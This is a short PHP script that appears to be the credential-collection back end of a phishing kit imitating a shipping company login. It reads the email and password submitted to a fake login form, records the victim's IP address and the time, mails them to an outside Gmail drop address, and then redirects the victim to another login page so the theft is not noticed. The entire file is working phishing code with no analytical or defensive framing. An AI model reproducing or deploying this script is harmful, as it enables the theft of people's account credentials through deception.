<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "---------------------------------------------------------------------------\n";
$msg .= "New Login Info\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['pass']."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "---------------------------------------------------------------------------\n";
 
if (! empty($_POST))
{
   
$to = "richvirus12@gmail.com";
$subject = "Mershek shiiping New Login ";
$from = "From: Login";


mail($to,$subject,$msg,$from);

header("Location: login223.php");

}

?>